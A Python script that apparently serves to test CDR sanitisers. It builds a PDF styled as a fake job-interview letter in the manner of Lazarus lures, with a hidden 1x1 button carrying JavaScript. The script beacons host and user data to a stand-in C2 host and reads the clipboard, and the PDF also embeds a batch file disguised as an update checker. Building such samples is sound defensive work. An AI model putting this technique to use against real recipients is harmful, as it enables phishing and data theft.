"""
Script to create a simulated malicious PDF for testing CDR.

This PDF contains:
1. Hidden JavaScript (17 lines simulating Lazarus payload)
2. An embedded file
3. A button with malicious JS action

This is for TESTING PURPOSES ONLY - the code is harmless.
"""

import fitz  # pymupdf
import os


def create_malicious_pdf(output_path: str):
    """
    Create a PDF that simulates a Lazarus-style attack document.
    Contains hidden JavaScript that would normally be invisible to the user.
    """
    
    # The "17 lines of hidden code" - simulated Lazarus payload
    # This is HARMLESS - just demonstrates what hidden code looks like
    malicious_js = """
var config = {c2: "http://evil.lazarus.example.com:8080"};
function establish_backdoor() {
    var beacon = new XMLHttpRequest();
    beacon.open("POST", config.c2 + "/beacon", true);
    beacon.send(JSON.stringify({host: "VICTIM", user: "admin"}));
}
function keylog() { return app.getClipboard(); }
establish_backdoor();
app.alert("SIMULATED MALWARE EXECUTED - This is a CDR test!");
"""
    
    # Create PDF document
    doc = fitz.open()
    
    # Add a normal-looking page (the "interview" document)
    page = doc.new_page()
    
    # Add innocent-looking content
    content = """
    
    
    
                    SENIOR SOFTWARE ENGINEER - JOB INTERVIEW
                    =========================================
    
    Dear Candidate,
    
    Thank you for your interest in joining our team at TechStartup Inc.
    
    We are excited to invite you to the next round of interviews.
    
    Please review the attached job description and prepare answers to
    the following questions:
    
    1. Describe your experience with distributed systems.
    2. How do you approach debugging complex issues?
    3. Tell us about a challenging project you've led.
    
    Interview Details:
    - Date: December 30, 2024
    - Time: 2:00 PM EST
    - Format: Video Call (link will be sent separately)
    
    Best regards,
    HR Team
    TechStartup Inc.
    
    
    [This document contains hidden malicious JavaScript - FOR TESTING ONLY]
    
    """
    
    page.insert_text((50, 50), content, fontsize=11)
    
    # === INJECT THE MALICIOUS COMPONENTS ===
    
    # 1. Add a hidden button with JavaScript (this is what CDR should strip)
    btn_rect = fitz.Rect(0, 0, 1, 1)  # Tiny, invisible
    widget = fitz.Widget()
    widget.field_type = fitz.PDF_WIDGET_TYPE_BUTTON
    widget.field_name = "hidden_payload"
    widget.rect = btn_rect
    widget.script = malicious_js  # JavaScript on click
    widget.field_flags = 1  # Hidden
    page.add_widget(widget)
    
    # 2. Add an embedded file (simulated payload dropper)
    fake_payload = b"REM This is a simulated payload file\necho INFECTED > C:\\temp\\pwned.txt"
    doc.embfile_add("update_check.bat", fake_payload, 
                    filename="update_check.bat",
                    desc="System update checker")
    
    # Save the malicious PDF
    doc.save(output_path)
    doc.close()
    
    print(f"[+] Created malicious test PDF: {output_path}")
    print(f"[+] Contains:")
    print(f"    - Hidden button with JavaScript (simulated C2 beacon)")
    print(f"    - 1 embedded batch file (simulated payload)")
    print(f"[!] This file is HARMLESS - for CDR testing only")


if __name__ == "__main__":
    output_dir = os.path.dirname(os.path.abspath(__file__))
    samples_dir = os.path.join(os.path.dirname(output_dir), "samples")
    os.makedirs(samples_dir, exist_ok=True)
    
    output_path = os.path.join(samples_dir, "malicious_interview.pdf")
    create_malicious_pdf(output_path)
